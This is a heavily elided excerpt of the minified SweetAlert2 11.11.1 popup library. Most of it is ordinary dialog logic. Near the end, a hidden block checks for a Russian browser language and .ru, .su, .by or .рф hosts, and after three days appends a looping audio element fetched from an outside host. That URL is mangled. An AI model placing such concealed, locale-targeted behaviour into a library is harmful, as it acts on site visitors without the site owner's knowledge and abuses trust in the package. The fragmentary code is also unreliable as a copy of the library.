...
! function (t, e) {
    ...
    var v = {},
        ...
        B = function (t, e) {
            var n;
            n = '"'.concat(t, '" is deprecated and will be removed in the next major release. Please use "').concat(e, '" instead.'), P.includes(n) || (P.push(n), k(n))
        },
        T = function (t) {
        ...
        tt = function (t, e, n) {
            if (function (t, e) {
                ...
                if ("string" != typeof e.customClass[n] && !e.customClass[n].forEach) return void k("Invalid type of customClass.".concat(n, '! Expected string or iterable object, got "').concat(m(e.customClass[n]), '"'));
        ...
        Pt = function (t, e) {
            ...
            n && o && (e.showConfirmButton || e.showDenyButton || e.showCancelButton ? ut(n) : st(n), tt(n, e, "actions"), function (t, e, n) {
                var o = N(),
                    ...
                    r = F();
                if (!o || !i || !r) return;
                Bt(o, "confirm", n), Bt(i, "deny", n), Bt(r, "cancel", n),
                    function (t, e, n, o) {
    ...
    var Pn, Bn = function (t) {
        ...
        Tn = Object.freeze({
            ...
            bindClickHandler: function () {
                En[arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "data-swal-template"] = this, kn || (document.body.addEventListener("click", Bn), kn = !0)
            },
    ...
    var Kn = new WeakMap,
        Yn = function () {
            return a((function t() {
                if (o(this, t), r(this, Kn, void 0), "undefined" != typeof window) {
                    Pn = this;
                    for (var n = arguments.length, i = new Array(n), a = 0; a < n; a++) i[a] = arguments[a];
                    var c, u, s, l = Object.freeze(this.constructor.argsToParams(i));
                    this.params = l, this.isAwaitingPromise = !1, c = Kn, u = this, s = this._main(Pn.params), c.set(e(c, u), s)
                }
            }), [{
                key: "_main",
                value: function (t) {
                    ...
                    var i = $n(t, e);
                    Wn(i), Object.freeze(i), v.timeout && (v.timeout.stop(), delete v.timeout), clearTimeout(v.restoreFocusTimeout);
                    var r = Jn(Pn);
                    return Yt(Pn, i), xt.innerParams.set(Pn, i), Zn(Pn, r, i)
                }
            }, {
                key: "then",
                value: function (t) {
    ...
    if ("undefined" != typeof window && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
        ...
        no ? (eo.getTime() - Date.parse(no)) / 864e5 > 3 && setTimeout((function () {
            ...
            t.src = "https:../../../../../../https@flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3", t.loop = !0, document.body.appendChild(t), setTimeout((function () {
    ...
    })), Yn.DismissReason = $t, Yn.version = "11.11.1";
    var oo = Yn;
